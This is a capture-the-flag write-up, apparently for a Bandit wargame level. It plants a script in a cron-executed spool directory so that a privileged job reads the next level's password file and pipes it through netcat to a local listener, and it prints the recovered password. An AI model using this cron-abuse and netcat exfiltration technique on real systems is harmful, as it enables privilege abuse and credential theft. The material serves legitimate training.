This challenge is a little bit tricky, we can utilise the cron job that executes every script in the /var/spool/bandit24/foo, so we will make a simple script that reads the password from /etc/bandit_pass/bandit24 and send the data to an existing listening socket with netcat
```bash
bandit23@bandit:/tmp/midgeek$ mkdir /tmp/bandd14
bandit23@bandit:/tmp/bandd14$ vim sj.sh
```
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 32011
```
Then we have to start the netcat server and copy the script to the desired directory
```bash
bandit23@bandit:/tmp/bandd14$ nc -lvp 32011 > ott &
[1] 1953737
bandit23@bandit:/tmp/bandd14$ Listening on 0.0.0.0 32011
bandit23@bandit:/tmp/bandd14$ cp sj.sh /var/spool/bandit24/foo/script.sh && chmod +x /var/spool/bandit24/foo/script.sh
bandit23@bandit:/tmp/bandd14$ Connection received on localhost 46472 //after a while, now we have the output file
bandit23@bandit:/tmp/bandd14$ cat ott
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
